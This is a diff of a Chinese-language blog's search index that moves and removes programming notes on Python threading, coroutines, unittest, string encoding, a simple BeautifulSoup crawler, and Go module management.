-<p>从函数启动的示例代码如下：</p>
-<pre><code class="language-python">import time
-from threading import Thread
-
-
-def sub_task(name:str):
-    print(name)
-    time.sleep(2)
-    print(f'{name} done!')
-
-
-t1 = Thread(target=sub_task, args=('bob',))
-t2 = Thread(target=sub_task, args=('otto',))
-
-t1.start()
-t2.start()
-
-t1.join()
-t2.join()
-
-print('all done!')
-</code></pre>
-<p>从类启动的示例代码如下：</p>
-<pre><code class="language-python">#!/usr/bin/python3
-
-# 转自：https://www.runoob.com/python3/python3-multithreading.html
-
-import threading
-import time
-
-exitFlag = 0
-
-class myThread (threading.Thread):
-    def __init__(self, threadID, name, delay):
-        threading.Thread.__init__(self)
-        self.threadID = threadID
-        self.name = name
-        self.delay = delay
-    def run(self):
-        print (&quot;开始线程：&quot; + self.name)
-        print_time(self.name, self.delay, 5)
-        print (&quot;退出线程：&quot; + self.name)
-
-def print_time(threadName, delay, counter):
-    while counter:
-        if exitFlag:
-            threadName.exit()
-        time.sleep(delay)
-        print (&quot;%s: %s&quot; % (threadName, time.ctime(time.time())))
-        counter -= 1
-
-# 创建新线程
-thread1 = myThread(1, &quot;Thread-1&quot;, 1)
-thread2 = myThread(2, &quot;Thread-2&quot;, 2)
-
-# 开启新线程
-thread1.start()
-thread2.start()
-thread1.join()
-thread2.join()
-print (&quot;退出主线程&quot;)
-</code></pre>
-<h3 id="协程"><a class="header-anchor" href="#协程"></a>协程</h3>
-<p>使用<code>async</code>和<code>await</code>关键字进行声明</p>
-<p>例如：</p>
-<pre><code class="language-python">async def get_burgers(number: int):# 告诉python这个函数支持异步执行
-  # Do some asynchronous stuff to create the burgers
-  return burgers
-
-burgers = await get_burgers(2) # 告诉python可以挂起这一步的执行先去执行别的操作
-</code></pre>
-<p>ps: <code>await</code>必须在使用<code>async def</code>声明的函数中使用</p>
-<h2 id="单元测试"><a class="header-anchor" href="#单元测试"></a>单元测试</h2>
-<p>对函数进行测试，给他一个输入，验证他的输出是否符合预期</p>
-<pre><code class="language-python">import unittest # 导入单元测试模块
-
-# 要测试的函数
-def my_div(a, b):
-    return a / b
-
-# 测试类
-class TestFunc(unittest.TestCase):
-    # 测试用例
-    def test_div(self):
-        self.assertEqual(2, my_div(2,1)) # 判断结果是否等于
-        self.assertEqual(-2, my_div(2,-1))
-        
-    def test_div2(self): # 可以同时测试多个函数
-        pass
-
-if __name__ == &quot;__main__&quot;:
-    unittest.main()
-</code></pre>
-<p>在 unittest 的模块中，还有特别丰富的测试方式，常用如下：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">assert</th>
-<th style="text-align:left">含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">assertEqual(a, b)</td>
-<td style="text-align:left"><code>a == b</code></td>
-</tr>
-<tr>
-<td style="text-align:left">assertNotEqual(a, b)</td>
-<td style="text-align:left"><code>a != b</code></td>
-</tr>
-<tr>
-<td style="text-align:left">assertTrue(condition)</td>
-<td style="text-align:left">condition 是不是 True</td>
-</tr>
-<tr>
-<td style="text-align:left">assertFalse(condition)</td>
-<td style="text-align:left">condition 是不是 False</td>
-</tr>
-<tr>
-<td style="text-align:left">assertGreater(a, b)</td>
-<td style="text-align:left"><code>a &gt; b</code></td>
-</tr>
-<tr>
-<td style="text-align:left">assertGreaterThan(a, b)</td>
-<td style="text-align:left"><code>a &gt;= b</code></td>
-</tr>
-<tr>
-<td style="text-align:left">assertLess(a, b)</td>
-<td style="text-align:left"><code>a &lt; b</code></td>
-</tr>
-<tr>
-<td style="text-align:left">assertLessEqual(a, b)</td>
-<td style="text-align:left"><code>a &lt;= b</code></td>
-</tr>
-<tr>
-<td style="text-align:left">assertIs(a, b)</td>
-<td style="text-align:left"><code>a is b</code>，a 和 b 是不是同一对象</td>
-</tr>
-<tr>
-<td style="text-align:left">assertIsNot(a, b)</td>
-<td style="text-align:left"><code>a is not b</code>，a 和 b 是不是不同对象</td>
-</tr>
-<tr>
-<td style="text-align:left">assertIsNone(a)</td>
-<td style="text-align:left"><code>a is None</code>，a 是不是 None</td>
-</tr>
-<tr>
-<td style="text-align:left">assertIsNotNone(a)</td>
-<td style="text-align:left"><code>a is not None</code>，a 不是 None？</td>
-</tr>
-<tr>
-<td style="text-align:left">assertIn(a, b)</td>
-<td style="text-align:left"><code>a in b</code>, a 在 b 里面？</td>
-</tr>
-<tr>
-<td style="text-align:left">assertNotIn(a, b)</td>
-<td style="text-align:left"><code>a not in b</code>，a 不在 b 里？</td>
-</tr>
-<tr>
-<td style="text-align:left">assertRaises(err)</td>
-<td style="text-align:left">通常和 with 一起用，判断 with 里的功能是否会报错</td>
-</tr>
-</tbody>
-</table>
-<h2 id="python3-VS-python2"><a class="header-anchor" href="#python3-VS-python2"></a>python3  VS  python2</h2>
-<p><strong>在编码上的区别</strong></p>
-<p>​		在 Python2 中，字符串有两个类型，一个是 unicode，一个是 str，前者表示文本字符串，后者表示字节序列，不过两者并没有明显的界限，开发时容易出现编码错误。在 Python3 中对两者做了严格区分，分别用 str 表示字符串，bytes 表示字节序列，任何需要写入文本或者网络传输的数据都只接收字节序列，这就从源头上阻止了编码错误的问题。</p>
-<p>​		要指定一个字符串为 bytes 类型，有三种方法：</p>
-<ul>
-<li>字符串前（引号前）加上前缀<code>b</code> ，但这种方法仅支持 ASCII 字符串；</li>
-<li>使用<code>encode()</code>函数</li>
-<li>使用<code>bytes()</code>构造函数</li>
-</ul>
-<pre><code class="language-python">str_a = b&quot;Hello World!&quot;				#正确
-str_b = b&quot;一个字符串。&quot;				#错误
-str_c = &quot;一个字符串&quot;.encode('utf-8')	#正确，不指定编码方式也默认以utf-8编码
-str_d = bytes(&quot;abcde&quot;,'utf-8')		#正确，第二个参数不可省略
-</code></pre>
-<p>C语言的 printf 函数不支持 Unicode 字符串的输出。在 python3 中想要调用C语言的printf函数，需要将参数由 Unicode 字符串转化为字节序列</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>golang Web后端</title>
     <url>/2021/07/22/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Web%E5%90%8E%E7%AB%AF/</url>
     <content><![CDATA[<p>一个简单的web服务器</p>
@@ -3944,6 +4014,141 @@ src/
 <blockquote>
 <p>每一个可独立运行的Go程序，必定包含一个<code>package main</code>，在这个<code>main</code>包中必定包含一个入口函数<code>main</code>，而这个函数既没有参数，也没有返回值。</p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>编程语言</category>
+        <category>go</category>
+      </categories>
+      <tags>
+        <tag>go</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>golang mod包管理</title>
+    <url>/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<p>环境变量 GO111MODULE=on 时， go modules 功能开启，go依赖包的存放和查找位置为</p>
+<blockquote>
+<p>$GOPATH/pkg/mod</p>
+</blockquote>
+<p>golang提供了 go mod 命令来使⽤ go modules 管理包</p>
+<p>开启 go modules 功能后的包查找路径为<code>项⽬⽬录/vendor</code>-&gt;<code>$GOPATH/pkg/mod</code></p>
+<p>该⽅式下go项⽬源码不⼀定要保存在<code>$GOPATH/src</code>⽬录下</p>
+<p>mod命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>download</td>
+<td>下载依赖包</td>
+</tr>
+<tr>
+<td>init</td>
+<td>初始化go.mod</td>
+</tr>
+<tr>
+<td>verify</td>
+<td>在当前目录初始化mod</td>
+</tr>
+<tr>
+<td>edit</td>
+<td>编辑go.mod</td>
+</tr>
+<tr>
+<td>tidy</td>
+<td>拉取缺少的模块，移除不⽤的模块</td>
+</tr>
+<tr>
+<td>graph</td>
+<td>打印模块依赖图</td>
+</tr>
+<tr>
+<td>vendor</td>
+<td>将依赖复制到项目的vendor目录下</td>
+</tr>
+<tr>
+<td>verify</td>
+<td>验证依赖是否正确</td>
+</tr>
+</tbody>
+</table>
+<p>使用示例：</p>
+<p>现有源文件如下</p>
+<pre><code class="language-text">$ ls
+main.go
+
+$ cat main.go
+package main
+import (
+	&quot;go.uber.org/zap&quot;
+)
+func main() {
+    logger, _ := zap.NewProduction()
+    defer logger.Sync()
+    sugar := logger.Sugar()
+    sugar.Info(&quot;hello world&quot;)
+}
+</code></pre>
+<p>在项⽬⽬录下使⽤<code>go mod init</code>初始化项⽬，后⾯可以跟包名</p>
+<p>如<code>go mod init github.com/jacksonyoudi/gomodone</code></p>
+<p>此时项⽬⽬录下多出了<code>go.mod</code>⽂件，但⽂件中还没有描述任何引⼊包</p>
+<pre><code class="language-text">$ go mod init
+go: creating new go.mod: module helloworld
+$ ls
+go.mod main.go
+$ cat go.mod
+module helloworld
+go 1.16
+</code></pre>
+<p>使⽤<code>go mod tidy</code>更新项⽬中的依赖包，此时源⽂件中的zap包被加⼊到mod⽂件中，且⽣成了最新的<code>go.sum</code>⽂件</p>
+<pre><code class="language-text">$ go mod tidy
+go: finding module for package go.uber.org/zap
+go: found go.uber.org/zap in go.uber.org/zap v1.17.0
+$ ls
+go.mod go.sum main.go
+$ cat go.mod
+module helloworld
+go 1.16
+require go.uber.org/zap v1.17.0
+</code></pre>
+<p>go.mod⽂件⼀旦创建后，它的内容将会被go toolchain全⾯掌控。</p>
+<p>go toolchain会在各类命令（如go get、go build、go mod等）执⾏时，修改和维护go.mod⽂件</p>
+<blockquote>
+<p>go.mod 提供了 <code>module</code>、<code>require</code>、<code>replace</code> 和 <code>exclude</code> 四个命令</p>
+<p><code>module</code> 语句指定包的名字（路径）</p>
+<p><code>require</code> 语句指定的依赖项模块（常用）</p>
+<p><code>replace</code> 语句可以替换依赖项模块（常用)</p>
+<p><code>exclude</code> 语句可以忽略依赖项模块</p>
+</blockquote>
+<p>⼀个典型go.mod⽂件</p>
+<pre><code class="language-go">module golang_exp
+go 1.16
+require (
+    github.com/valyala/fasthttp v1.26.0
+    go.etcd.io/bbolt v1.3.5
+    golang.org/x/net v0.0.0-20210521195947-fe42d452be8f
+    golang.org/x/sys v0.0.0-20210521203332-0cec03c779c1
+    google.golang.org/genproto v0.0.0-20210524171403-669157292da3
+    google.golang.org/grpc v1.38.0
+)
+replace (
+    //使用本地包来替换导入包
+    //包导入名 =&gt; 本地包相对路径/绝对路径
+    firstgo/packagetest1 =&gt; ../packagetest1
+    firstgo/packagetest2 =&gt; ../packagetest2
+    
+)
+</code></pre>
+<p>导入本地<code>module</code>:<a href="https://www.cnblogs.com/sebuntin2020/p/12435343.html">https://www.cnblogs.com/sebuntin2020/p/12435343.html</a></p>
+<p>import 如下</p>
+<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" alt="image-20210713150318009"></p>
+<p>go.mod 如下</p>
+<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" alt="image-20210713150712969"></p>
+<p>之所以要是 <a href="http://github.com/myModule">github.com/myModule</a> 的格式，是因为在 go1.13及以上版本 中， go module 名称规范要求路径的第一部分必须满足域名规范，否则可能会报类似 <code>malformed module path &quot;myModule&quot;: missing dot in first path element</code> 这样的错误。</p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -4107,194 +4312,6 @@ num = 4<br>
       <tags>
         <tag>go</tag>
         <tag>并发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>golang mod包管理</title>
-    <url>/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<p>环境变量 GO111MODULE=on 时， go modules 功能开启，go依赖包的存放和查找位置为</p>
-<blockquote>
-<p>$GOPATH/pkg/mod</p>
-</blockquote>
-<p>golang提供了 go mod 命令来使⽤ go modules 管理包</p>
-<p>开启 go modules 功能后的包查找路径为<code>项⽬⽬录/vendor</code>-&gt;<code>$GOPATH/pkg/mod</code></p>
-<p>该⽅式下go项⽬源码不⼀定要保存在<code>$GOPATH/src</code>⽬录下</p>
-<p>mod命令</p>
-<table>
-<thead>
-<tr>
-<th>命令</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>download</td>
-<td>下载依赖包</td>
-</tr>
-<tr>
-<td>init</td>
-<td>初始化go.mod</td>
-</tr>
-<tr>
-<td>verify</td>
-<td>在当前目录初始化mod</td>
-</tr>
-<tr>
-<td>edit</td>
-<td>编辑go.mod</td>
-</tr>
-<tr>
-<td>tidy</td>
-<td>拉取缺少的模块，移除不⽤的模块</td>
-</tr>
-<tr>
-<td>graph</td>
-<td>打印模块依赖图</td>
-</tr>
-<tr>
-<td>vendor</td>
-<td>将依赖复制到项目的vendor目录下</td>
-</tr>
-<tr>
-<td>verify</td>
-<td>验证依赖是否正确</td>
-</tr>
-</tbody>
-</table>
-<p>使用示例：</p>
-<p>现有源文件如下</p>
-<pre><code class="language-text">$ ls
-main.go
-
-$ cat main.go
-package main
-import (
-	&quot;go.uber.org/zap&quot;
-)
-func main() {
-    logger, _ := zap.NewProduction()
-    defer logger.Sync()
-    sugar := logger.Sugar()
-    sugar.Info(&quot;hello world&quot;)
-}
-</code></pre>
-<p>在项⽬⽬录下使⽤<code>go mod init</code>初始化项⽬，后⾯可以跟包名</p>
-<p>如<code>go mod init github.com/jacksonyoudi/gomodone</code></p>
-<p>此时项⽬⽬录下多出了<code>go.mod</code>⽂件，但⽂件中还没有描述任何引⼊包</p>
-<pre><code class="language-text">$ go mod init
-go: creating new go.mod: module helloworld
-$ ls
-go.mod main.go
-$ cat go.mod
-module helloworld
-go 1.16
-</code></pre>
-<p>使⽤<code>go mod tidy</code>更新项⽬中的依赖包，此时源⽂件中的zap包被加⼊到mod⽂件中，且⽣成了最新的<code>go.sum</code>⽂件</p>
-<pre><code class="language-text">$ go mod tidy
-go: finding module for package go.uber.org/zap
-go: found go.uber.org/zap in go.uber.org/zap v1.17.0
-$ ls
-go.mod go.sum main.go
-$ cat go.mod
-module helloworld
-go 1.16
-require go.uber.org/zap v1.17.0
-</code></pre>
-<p>go.mod⽂件⼀旦创建后，它的内容将会被go toolchain全⾯掌控。</p>
-<p>go toolchain会在各类命令（如go get、go build、go mod等）执⾏时，修改和维护go.mod⽂件</p>
-<blockquote>
-<p>go.mod 提供了 <code>module</code>、<code>require</code>、<code>replace</code> 和 <code>exclude</code> 四个命令</p>
-<p><code>module</code> 语句指定包的名字（路径）</p>
-<p><code>require</code> 语句指定的依赖项模块（常用）</p>
-<p><code>replace</code> 语句可以替换依赖项模块（常用)</p>
-<p><code>exclude</code> 语句可以忽略依赖项模块</p>
-</blockquote>
-<p>⼀个典型go.mod⽂件</p>
-<pre><code class="language-go">module golang_exp
-go 1.16
-require (
-    github.com/valyala/fasthttp v1.26.0
-    go.etcd.io/bbolt v1.3.5
-    golang.org/x/net v0.0.0-20210521195947-fe42d452be8f
-    golang.org/x/sys v0.0.0-20210521203332-0cec03c779c1
-    google.golang.org/genproto v0.0.0-20210524171403-669157292da3
-    google.golang.org/grpc v1.38.0
-)
-replace (
-    //使用本地包来替换导入包
-    //包导入名 =&gt; 本地包相对路径/绝对路径
-    firstgo/packagetest1 =&gt; ../packagetest1
-    firstgo/packagetest2 =&gt; ../packagetest2
-    
-)
-</code></pre>
-<p>导入本地<code>module</code>:<a href="https://www.cnblogs.com/sebuntin2020/p/12435343.html">https://www.cnblogs.com/sebuntin2020/p/12435343.html</a></p>
-<p>import 如下</p>
-<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150318009.png" alt="image-20210713150318009"></p>
-<p>go.mod 如下</p>
-<p><img src="/2021/07/21/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/mod%E5%8C%85%E7%AE%A1%E7%90%86/image-20210713150712969.png" alt="image-20210713150712969"></p>
-<p>之所以要是 <a href="http://github.com/myModule">github.com/myModule</a> 的格式，是因为在 go1.13及以上版本 中， go module 名称规范要求路径的第一部分必须满足域名规范，否则可能会报类似 <code>malformed module path &quot;myModule&quot;: missing dot in first path element</code> 这样的错误。</p>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>go</category>
-      </categories>
-      <tags>
-        <tag>go</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python实战</title>
-    <url>/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
-    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
-<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
-<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
-<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
-<p>使用requests库来获取网站的html页面</p>
-<pre><code class="language-python">import requests
-url = &quot;http://www.csu.edu.cn/index/xndh.htm&quot;
-try:
-    r = requests.get(url)
-    r.raise_for_status()				#检查r的状态码是否为200，若不是则抛出异常
-    r.encoding = r.apparent_encoding	#设置编码方式为从内容中分析出的编码方式
-except:
-    print(&quot;error!&quot;)
-</code></pre>
-<p><img src="/2021/01/31/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/20200225122713475.png" alt="img"></p>
-<p>encoding是从http中的header中的charset字段中提取的编码方式，若header中没有charset字段则默认为ISO-8859-1编码模式，则无法解析中文，产生乱码</p>
-<h3 id="提取内容"><a class="header-anchor" href="#提取内容"></a>提取内容</h3>
-<p>利用BeautifulSoup库可以很方便地对从HTML或XML文档中提取我们想要的数据。</p>
-<pre><code class="language-python">from bs4 import BeautifulSoup
-html = r.text
-soup = BeautifulSoup(html,'html.parser')		#将html解析成BeautifulSoup对象
-
-#BeautifulSoup类的find_all()函数可以从文档树中找到特定的标签（tag）
-#这里获得所有的a标签
-for i in soup.find_all('a'):
-    #tag的属性值可直接用 tag_name['属性名'] 的方式获得
-    #判断链接地址是否为一个网站
-    if not i['href'].find('http'):
-        # 构造输出
-        # tag_name.string 即 &lt;tag_name&gt;xxx&lt;/tag_name&gt; 中的xxx
-        str1 = &quot;网址：&quot; + str(i['href']) + &quot;   名称：&quot; + str(i.string) + '\n'
-		# 输出一条链接的地址及名称
-        print(str1)
-</code></pre>
-<p>利用以上代码就可以实现一个简单的爬虫程序了。</p>
-<p>爬虫的原理比较简单，关键在于如何对爬取到的数据进行筛选的过程。</p>
-<p>之后可以尝试对网页中的链接进行递归爬取等</p>
-<h3 id="链接去重"><a class="header-anchor" href="#链接去重"></a>链接去重</h3>
-<h3 id="并发爬取"><a class="header-anchor" href="#并发爬取"></a>并发爬取</h3>
-<h2 id="爬虫框架"><a class="header-anchor" href="#爬虫框架"></a>爬虫框架</h2>
-<h3 id="scrapy"><a class="header-anchor" href="#scrapy"></a>scrapy</h3>
-]]></content>
-      <categories>
-        <category>编程语言</category>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
 </search>
